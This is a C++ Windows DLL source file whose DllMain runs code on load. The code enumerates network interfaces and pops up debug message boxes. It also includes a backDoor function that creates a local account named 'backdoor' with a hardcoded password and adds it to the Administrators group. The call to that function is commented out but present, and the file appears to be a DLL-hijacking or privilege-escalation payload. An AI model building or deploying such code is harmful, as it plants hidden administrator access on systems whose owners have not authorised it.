#include "pch.h"
#include <iostream>
#include <windows.h>
#include <LM.h>
#include <iostream>
#include <comdef.h>
#include <netcon.h>
#pragma comment(lib, "Netapi32.lib")
using namespace std;
wstring name = L"backdoor";
LPWSTR lpName = const_cast<wchar_t *>(name.c_str());
wstring password = L"localadmin123!";
LPWSTR lpPassword = const_cast<wchar_t *>(password.c_str());
DWORD adduserStatus;
USER_INFO_1 userinfo;

int trigger()
{
	MessageBox(
        NULL,
        (LPCWSTR)L"Hello World",
        (LPCWSTR)L"Hello World",
        MB_ICONWARNING
    );

	 HRESULT hResult;

    typedef void(__stdcall* LPNcFreeNetconProperties)(NETCON_PROPERTIES* pProps);
    HMODULE hModule = LoadLibrary(L"netshell.dll");
    if (hModule == NULL) { return 1; }
    LPNcFreeNetconProperties NcFreeNetconProperties = (LPNcFreeNetconProperties)GetProcAddress(hModule, "NcFreeNetconProperties");

    hResult = CoInitializeEx(0, COINIT_MULTITHREADED);
    if (SUCCEEDED(hResult))
    {
        INetConnectionManager* pConnectionManager = 0;
        hResult = CoCreateInstance(CLSID_ConnectionManager, 0, CLSCTX_ALL, __uuidof(INetConnectionManager), (void**)&pConnectionManager);
        if (SUCCEEDED(hResult))
        {
            IEnumNetConnection* pEnumConnection = 0;
            hResult = pConnectionManager->EnumConnections(NCME_DEFAULT, &pEnumConnection);
            if (SUCCEEDED(hResult))
            {
                INetConnection* pConnection = 0;
                ULONG count;
                while (pEnumConnection->Next(1, &pConnection, &count) == S_OK)
                {
                    NETCON_PROPERTIES* pConnectionProperties = 0;
                    hResult = pConnection->GetProperties(&pConnectionProperties);
                    if (SUCCEEDED(hResult))
                    {
                        wprintf(L"Interface: %ls\n", pConnectionProperties->pszwName);
                        NcFreeNetconProperties(pConnectionProperties);
                    }
                    else
                        wprintf(L"[-] INetConnection::GetProperties() failed. Error code = 0x%08X (%ls)\n", hResult, _com_error(hResult).ErrorMessage());
				MessageBox(
        NULL,
        (LPCWSTR)L"fail1",
        (LPCWSTR)L"Account Details",
        MB_ICONWARNING
    );
                    pConnection->Release();
                }
                pEnumConnection->Release();
            }
            else
                wprintf(L"[-] IEnumNetConnection::EnumConnections() failed. Error code = 0x%08X (%ls)\n", hResult, _com_error(hResult).ErrorMessage());
			MessageBox(
        NULL,
        (LPCWSTR)L"fail2",
        (LPCWSTR)L"Account Details",
        MB_ICONWARNING
    );
            pConnectionManager->Release();
        }
        else
            wprintf(L"[-] CoCreateInstance() failed. Error code = 0x%08X (%ls)\n", hResult, _com_error(hResult).ErrorMessage());
        CoUninitialize();
    }
    else
        wprintf(L"[-] CoInitializeEx() failed. Error code = 0x%08X (%ls)\n", hResult, _com_error(hResult).ErrorMessage());
		MessageBox(
        NULL,
        (LPCWSTR)L"fail3",
        (LPCWSTR)L"Account Details",
        MB_ICONWARNING
    );
    
    FreeLibrary(hModule);
		MessageBox(
        NULL,
        (LPCWSTR)L"done",
        (LPCWSTR)L"Account Details",
        MB_ICONWARNING
    );
    wprintf(L"Done\n");
}

int backDoor(USER_INFO_1 userinfo)
{
	userinfo.usri1_name = lpName;
	userinfo.usri1_password = lpPassword;
	userinfo.usri1_password_age = 0;
	userinfo.usri1_priv = USER_PRIV_USER;
	userinfo.usri1_home_dir = NULL;
	userinfo.usri1_comment = NULL;
	userinfo.usri1_flags = UF_NORMAL_ACCOUNT;
	userinfo.usri1_script_path = NULL;
	_LOCALGROUP_MEMBERS_INFO_3 localgroupinfo;
	localgroupinfo.lgrmi3_domainandname = lpName;
	DWORD errorInStruct;
	adduserStatus = NetUserAdd(NULL, 1, (LPBYTE)&userinfo, &errorInStruct);
	if (adduserStatus)
	{
		return adduserStatus;
	}
	adduserStatus = NetLocalGroupAddMembers(NULL, ((wstring)L"Administrators").c_str(), 3, (LPBYTE)&localgroupinfo, 1);
	if (adduserStatus)
	{
		return adduserStatus;
	}

	return 0;
};

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		//adduserStatus = backDoor(userinfo);
		trigger();
		break;
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}
